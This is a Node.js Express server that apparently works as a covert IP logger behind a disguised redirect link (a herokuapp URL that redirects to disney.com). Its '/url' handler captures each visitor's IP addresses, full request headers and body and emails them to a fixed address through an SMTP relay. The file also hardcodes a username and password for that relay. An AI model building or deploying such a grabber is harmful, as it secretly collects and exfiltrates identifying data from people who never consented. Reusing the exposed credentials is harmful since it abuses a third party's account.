//https://zenu-lt.herokuapp.com/?r=https://disney.com&id=462462493463453

const express = require("express");
const app = express();
//const fs = require("fs");
const nodemailer = require("nodemailer");
const requestIp = require("request-ip");

app.use(express.static("public"));
app.use(express.json());

app.post("/url", (req, res) => {
  res.send();

  const fileData = {
    body: req.body,
    headers: JSON.stringify(req.headers),
    headersSocketRemoteAddress: req.socket.remoteAddress,
    ip: req.ip,
    remote_addr: req.remote_addr,
    requestIp: requestIp.getClientIp(req),
  };

  //console.log(JSON.stringify(req.headers));

  // async..await is not allowed in global scope, must use a wrapper
  async function main() {
    // create reusable transporter object using the default SMTP transport
    let transporter = nodemailer.createTransport({
      host: "smtp-relay.sendinblue.com",
      port: 587,
      secure: false, // true for 465, false for other ports
      auth: {
        user: "admin@thearomaapp.com", // generated ethereal user
        pass: "sVfk1npFwazby62E", // generated ethereal password
      },
    });

    // send mail with defined transport object
    let info = await transporter.sendMail({
      from: "system@tinsleymail.co.uk", // sender address
      to: "system@tinsleymail.co.uk", // list of receivers
      subject: "Visit", // Subject line
      text: JSON.stringify(fileData), // plain text body
      html: JSON.stringify(fileData), // html body
    });

    console.log("Message sent: %s", info.messageId);
  }

  main().catch(console.error);

  // fs.appendFile(
  //   "public/log.txt",
  //   JSON.stringify(fileData) + "\n\r",
  //   function (err) {
  //     if (err) throw err;
  //     console.log("Saved!");
  //   }
  // );
});

app.listen(process.env.PORT || 5000);
